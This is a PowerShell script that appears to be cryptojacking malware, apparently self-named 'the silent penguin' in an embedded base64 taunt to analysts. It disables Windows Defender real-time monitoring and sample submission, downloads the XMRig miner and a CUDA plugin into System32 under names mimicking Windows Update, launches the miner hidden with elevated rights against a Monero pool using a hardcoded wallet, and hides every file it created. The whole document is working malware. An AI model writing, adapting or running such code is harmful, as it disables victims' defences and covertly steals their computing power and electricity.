try{
    -WindowStyle Hidden
}
catch{
}
Write-host " Hello World " -ForegroundColor Blue

Start-Sleep -Seconds 19.5


Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SubmitSamplesConsent NeverSend

Set-Location C:\Windows\System32

Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-gcc-win64.zip" -OutFile 'WindowUpdate.zip'  

Start-Sleep -Seconds 100

Expand-Archive WindowUpdate.zip -DestinationPath WindowUpdate -Force 

Remove-Item WindowUpdate.zip -Force

Start-Sleep -Seconds 15

Rename-Item -Path C:\Windows\System32\WindowUpdate\xmrig-6.19.2 -NewName C:\Windows\System32\WindowUpdate\WindowUpdate

Set-Location C:\Windows\System32\WindowUpdate\WindowUpdate

Invoke-WebRequest "https://github.com/xmrig/xmrig-cuda/releases/download/v6.17.0/xmrig-cuda-6.17.0-cuda10_0-win64.zip" -OutFile 'cuda.zip' 

Expand-Archive cuda.zip -DestinationPath cuda -Force

Remove-Item cuda.zip -Force

Get-Item -Path C:\Windows\System32\WindowUpdate\WindowUpdate\cuda\* | Move-Item -Destination C:\Windows\System32\WindowUpdate\WindowUpdate\ -Force -Verbose 

Set-Location C:\Windows\System32\WindowUpdate\WindowUpdate 

Remove-Item cuda -Force -Recurse -Verbose 



"

aWYgeW91IGZpbmQgdGhpcyEgeW91IHN1Y2Nlc3MgaW4gbWFsd2FyZSBhbmFseXNpcyBhbmQgaWYgeW91IHRoaW5raW5nIGFib3V0IHdoYXQgdG8gY2FsbCB0aGlzIG1hbHdhcmUgY2FsbCBpdCAiIHRoZSBzaWxlbnQgcGVuZ3VpbiAiIAp5b3VyIHByb2dyYW1tZXIgZmVsbG93IDogVEhFIFBFTkdVSU4gT0YgVEhFIERFU0VSVA==

     _ _            _                 
 ___(_) | ___ _ __ | |_               
/ __| | |/ _ \ '_ \| __|              
\__ \ | |  __/ | | | |_               
|___/_|_|\___|_| |_|\__|              
                                      
                              _       
 _ __   ___ _ __   __ _ _   _(_)_ __  
| '_ \ / _ \ '_ \ / _` | | | | | '_ \ 
| |_) |  __/ | | | (_| | |_| | | | | |
| .__/ \___|_| |_|\__, |\__,_|_|_| |_|
|_|               |___/               




" | Out-File windows.update

(Get-Item windows.update).Attributes += 'Hidden'

Rename-Item -Path C:\Windows\System32\WindowUpdate\WindowUpdate\xmrig.exe -NewName C:\Windows\System32\WindowUpdate\WindowUpdate\update.exe

try {
    Start-Process -WindowStyle Hidden -FilePath "update.exe" -Verb RunAs -ArgumentList "--cuda -o xmr.2miners.com:2222 -u 8361qiichT6WUYHg7WWae9TNy4FjehhFp5Q8NCeCNLcHEHe5QRuUL1v8WMCvWGoJtVXL7gBfpPZC9YDs5g63YoEpD83wGdz -p x --tls -k --nicehash --coin monero"

}
catch {
    # Exception is stored in the automatic variable $_

    Start-Process -WindowStyle Hidden -FilePath "xmrig.exe" -Verb RunAs -ArgumentList "--cuda -o xmr.2miners.com:2222 -u 8361qiichT6WUYHg7WWae9TNy4FjehhFp5Q8NCeCNLcHEHe5QRuUL1v8WMCvWGoJtVXL7gBfpPZC9YDs5g63YoEpD83wGdz -p x --tls -k --nicehash --coin monero"

}


Get-ChildItem -Path 'C:\Windows\System32\WindowUpdate' -Recurse -Force | ForEach-Object {$_.attributes = "Hidden"}

Get-ChildItem -Path 'C:\Windows\System32\WindowUpdate\WindowUpdate' -Recurse -Force | ForEach-Object {$_.attributes = "Hidden"}

$FILE=Get-Item 'C:\Windows\System32\WindowUpdate' -Force
$FILE.attributes='Hidden'

$FILE=Get-Item 'C:\Windows\System32\WindowUpdate\WindowUpdate' -Force
$FILE.attributes='Hidden'
